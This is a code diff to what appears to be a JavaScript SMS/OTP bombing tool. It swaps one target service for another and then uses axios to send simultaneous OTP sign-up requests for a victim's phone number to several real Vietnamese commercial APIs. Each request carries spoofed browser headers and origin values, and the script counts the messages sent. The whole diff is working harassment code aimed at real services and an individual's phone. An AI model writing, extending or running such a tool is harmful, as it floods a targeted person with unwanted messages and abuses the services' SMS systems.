@@ -394,34 +394,6 @@ const payload = {
       'fromSys': 'WEBKHLC',
     };
 
-    const bestIncHeaders = {
-          'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
-          'Connection': 'keep-alive',
-          'DNT': '1',
-          'Origin': 'https://best-inc.vn',
-          'Referer': 'https://best-inc.vn/',
-          'Sec-Fetch-Dest': 'empty',
-          'Sec-Fetch-Mode': 'cors',
-          'Sec-Fetch-Site': 'cross-site',
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-          'accept': 'application/json',
-          'authorization': 'null',
-          'content-type': 'application/json',
-          'lang-type': 'vi-VN',
-          'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
-          'sec-ch-ua-mobile': '?1',
-          'sec-ch-ua-platform': '"Android"',
-          'x-auth-type': 'WEB',
-          'x-lan': 'VI',
-          'x-nat': 'vi-VN',
-          'x-timezone-offset': '7',
-        };
-
-        const bestIncData = {
-          'phoneNumber': phone,
-          'verificationCodeType': 1,
-        };
-
     const meeyIdHeaders = {
           'authority': 'v3.meeyid.com',
           'accept': '*/*',
@@ -449,6 +421,33 @@ const payload = {
           'phone': phone,
           'phoneCode': '+84',
           'refCode': '',
+        };
+
+    const oneLifeHeaders = {
+          'authority': 'api.onelife.vn',
+          'accept': '*/*',
+          'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+          'authorization': '',
+          'content-type': 'application/json',
+          'dnt': '1',
+          'domain': 'kingfoodmart',
+          'origin': 'https://kingfoodmart.com',
+          'referer': 'https://kingfoodmart.com/',
+          'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+          'sec-ch-ua-mobile': '?0',
+          'sec-ch-ua-platform': '"Windows"',
+          'sec-fetch-dest': 'empty',
+          'sec-fetch-mode': 'cors',
+          'sec-fetch-site': 'cross-site',
+          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        };
+
+        const oneLifeData = {
+          'operationName': 'SendOTP',
+          'variables': {
+            'phone': phone,
+          },
+          'query': 'mutation SendOTP($phone: String!) {\n  sendOtp(input: {phone: $phone, captchaSignature: "", email: ""}) {\n    otpTrackingId\n    __typename\n  }\n}',
         };
 
             
@@ -516,8 +515,8 @@ const payload = {
         axios.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', longChauData, {
           headers: longChauHeaders
         }), 
-        axios.post('https://v9-cc.800best.com/uc/account/sendsignupcode', bestIncData, { headers: bestIncHeaders }), 
         axios.post('https://v3.meeyid.com/auth/v4.1/register-with-phone', meeyIdData, { headers: meeyIdHeaders }),
+        axios.post('https://api.onelife.vn/v1/gateway/', oneLifeData, { headers: oneLifeHeaders }),
         ])
       .then(() => {
         successCount += 14;
